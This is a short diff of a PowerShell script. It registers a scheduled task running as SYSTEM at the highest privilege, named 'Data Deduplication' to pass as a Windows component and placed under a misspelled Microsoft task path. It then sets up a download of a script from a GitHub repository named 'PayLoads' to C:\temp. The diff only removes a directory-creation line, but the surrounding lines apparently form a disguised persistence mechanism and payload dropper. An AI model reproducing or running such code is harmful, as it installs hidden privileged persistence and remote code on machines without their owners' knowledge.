@@ -4,7 +4,6 @@ $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoi
 $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $Task = Register-ScheduledTask -TaskName "Data Deduplication" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -TaskPath "\Microsoft\Windows\temmp" -Force -ErrorAction Stop
 
-New-Item -ItemType Directory -Path "C:\temp"
 
 $url2 = "https://raw.githubusercontent.com/philcharlesjackson/PayLoads/main/newfolderscript.ps1"
 $output2 = "C:\temp\script.ps1"
